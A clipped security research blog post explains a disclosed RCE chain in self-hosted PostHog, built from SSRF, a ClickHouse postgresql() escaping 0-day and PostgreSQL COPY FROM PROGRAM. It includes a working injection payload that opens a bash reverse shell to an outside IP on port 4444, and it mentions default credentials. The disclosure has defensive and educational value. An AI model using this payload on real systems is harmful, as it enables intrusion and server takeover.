---
title: "Inside PostHog: How SSRF, a ClickHouse SQL Escaping 0day, and Default PostgreSQL Credentials Formed an RCE Chain (ZDI-25-099, ZDI-25-097, ZDI-25-096)"
source: https://mehmetince.net/inside-posthog-how-ssrf-a-clickhouse-sql-escaping-0day-and-default-postgresql-credentials-formed-an-rce-chain-zdi-25-099-zdi-25-097-zdi-25-096/
author:
  - Mehmet Ince
published: 2025-12-15
created: 2026-02-22
description: It was yet another day at the office. Our team was internally discussing moving to a different platform analytics solution. Our team was really leaning more towards Posthog. It’s one of the brilliant -I personally believe it’s the best- products on the market. And that’s where the story has begun… We have a somewhat unconventional—some […]
tags:
  - clippings/articles
  - SQL-Injection
---
# Inside PostHog: How SSRF, a ClickHouse SQL Escaping 0day, and Default PostgreSQL Credentials Formed an RCE Chain (ZDI-25-099, ZDI-25-097, ZDI-25-096)

![](https://mehmetince.net/wp-content/uploads/2025/12/posthog-e1765557833411.webp)

> [!summary]+
> > This article details a remote code execution (RCE) chain discovered in PostHog, an open-source product analytics platform. The author, Mehmet Ince, found the vulnerabilities during a 24-hour security review before potential adoption of the product.
> 
> The RCE chain consists of three main acts:
> 
> 1.  **Multiple Server-Side Request Forgery (SSRF) Vulnerabilities**: The primary SSRF was found in PostHog's webhook handler (a bypass of CVE-2023-46746). While the `test_slack_webhook` endpoint performed SSRF validation, the `PATCH` endpoint for saving the webhook URL did not. This allowed storing internal URLs, leading to a persistent SSRF. Crucially, the Rust webhook worker, which processes these webhooks, followed HTTP redirects, enabling the conversion of an internal POST request to an external GET request.
> 
> 2.  **ClickHouse SQL Injection 0-day (ZDI-25-097)**: PostHog uses ClickHouse as its analytics backend. The `postgresql()` table function in ClickHouse allows querying remote PostgreSQL databases. A vulnerability was discovered where user-controlled input (specifically the table name parameter) in a ClickHouse query was improperly escaped (using a backslash `\` instead of doubling single quotes `''`) when constructing the internal PostgreSQL query. This led to a SQL injection vulnerability.
> 
> 3.  **Escalation to RCE**: The SQL injection on the PostgreSQL database was escalated to RCE using PostgreSQL's `COPY FROM PROGRAM` feature. The payload strategically broke out of the `COPY` transaction using `;END;` and leveraged dollar quoting `$$` to inject a `bash -c \"bash -i >& /dev/tcp/... 0>&1\"` command for a reverse shell, bypassing ClickHouse's string literal escaping. Default PostgreSQL credentials were also a contributing factor.
> 
> **The RCE Chain (ZDI-25-099, ZDI-25-097, ZDI-25-096)**: The attack combines the SSRF to reach the internal ClickHouse instance, the ClickHouse SQL escaping flaw to inject malicious SQL into the internal PostgreSQL database, and PostgreSQL's `COPY FROM PROGRAM` to achieve command execution, ultimately resulting in a reverse shell on the PostgreSQL server. The author collaborated with the Zero Day Initiative (ZDI) for responsible disclosure.

## Act 3 – Clickhouse SQL injection in postgresql and sqlite table functions 0-day

PostHog is explicit about its architecture: ***“ClickHouse is our main analytics backend”***. Every event, every action, and every query ultimately flows through ClickHouse.

Once a reliable SSRF primitive existed, this made ClickHouse the most natural internal service to target. By default, ClickHouse exposes an `HTTP API` on `TCP port 8123`.

This interface is enabled out of the box and, in common self-hosted deployments, does not require authentication or API tokens. The API allows queries to be issued directly over HTTP.

By design, **HTTP `GET` requests to the query endpoint are treated as read-only**. Any operation that modifies data is expected to be performed via an HTTP `POST` request with a specific request body. This distinction initially suggests a strong safety boundary.

## Clickhouse Table Functions

One of the interesting features of the Clickhouse is called Table Functions, which can be used in the `FROM` clause of a `SELECT` statement. These functions create temporary, query-scoped tables that exist only for the duration of the query.

One such function is `postgresql()`, which allows ClickHouse to read from—or write to—a remote PostgreSQL database.

We can reach this postgresql server and fetch the data from the test table by using Clickhouse Table function as follows:

```sql
http://clickhouse:8123/?query=SELECT * FROM ('db:5432','posthog', 'posthog_table','posthog','posthog')
```

When I was reading the documentation, conceptually, the flow looks safe

But at the same time, more questions are raised on my mind. How do they actually make sure that transaction is READ only ? Because that’s what they say in their documentation. All the GET requests to the Clickhouse API can do operation with a READ ONLY mode.

Second question was more important:

How does the user-controlled input provided in a ClickHouse query end up escaping sanitization and being injected when ClickHouse internally builds the PostgreSQL query executed on the remote PostgreSQL database?

Here is the internally built PostgreSQL query to be executed on the remote db.

```sql
COPY (
    SELECT
        attname                         AS name,
        format_type(atttypid, atttypmod) AS type,
        attnotnull                      AS not_null,
        attndims                        AS dims,
        atttypid                        AS type_id,
        atttypmod                       AS type_modifier,
        attgenerated                    AS generated
    FROM
        pg_attribute
    WHERE
        attrelid = (
            SELECT
                oid
            FROM
                pg_class
            WHERE
                relname = 'posthog_table'
                AND relnamespace = (
                    SELECT
                        oid
                    FROM
                        pg_namespace
                    WHERE
                        nspname = 'public'
                )
        )
        AND NOT attisdropped
        AND attnum > 0
    ORDER BY
        attnum ASC
) TO STDOUT;
```

## Wrong PostgreSQL escaping leading to Remote PostgreSQL Injection Vulnerability

Escaping is tricky stuff. Especially the PostgreSQL universe; it can even get more complicated.

When I’ve seen the table name that I’ve provided is used on the final PostgreSQL query, I started to thinking about, *“What if they made a mistake on the escaping here and I can actually inject my own query into the final Postgresql query??*?”

```sql
http://clickhouse:8123/?query=SELECT * FROM ('db:5432','posthog', 'posthog_table\'','posthog','posthog')
```

I have added one single quote to the end of the username.

And BOOM!

>[!bug]
>They actually try to escape single quote with a back-slash, which is **just a string** for Postgresql universe.

```sql
COPY (
    SELECT
        attname                         AS name,
        format_type(atttypid, atttypmod) AS type,
        attnotnull                      AS not_null,
        attndims                        AS dims,
        atttypid                        AS type_id,
        atttypmod                       AS type_modifier,
        attgenerated                    AS generated
    FROM
        pg_attribute
    WHERE
        attrelid = (
            SELECT
                oid
            FROM
                pg_class
            WHERE
                relname = 'posthog_table\''
                AND relnamespace = (
                    SELECT
                        oid
                    FROM
                        pg_namespace
                    WHERE
                        nspname = 'public'
                )
        )
        AND NOT attisdropped
        AND attnum > 0
    ORDER BY
        attnum ASC
) TO STDOUT;
```

## Escalating SQL Injection to the Remote Code Execution

```sql
http://clickhouse:8123/?query=
SELECT *
FROM postgresql(
    'db:5432',
    'posthog',
    "posthog_use')) TO STDOUT;
    END;
    DROP TABLE IF EXISTS cmd_exec;
    CREATE TABLE cmd_exec (
        cmd_output text
    );
    COPY cmd_exec
    FROM PROGRAM $$
        bash -c \"bash -i >& /dev/tcp/172.31.221.180/4444 0>&1\"
    $$;
    SELECT * FROM cmd_exec;
    --",
    'posthog',
    'posthog'
)
#
```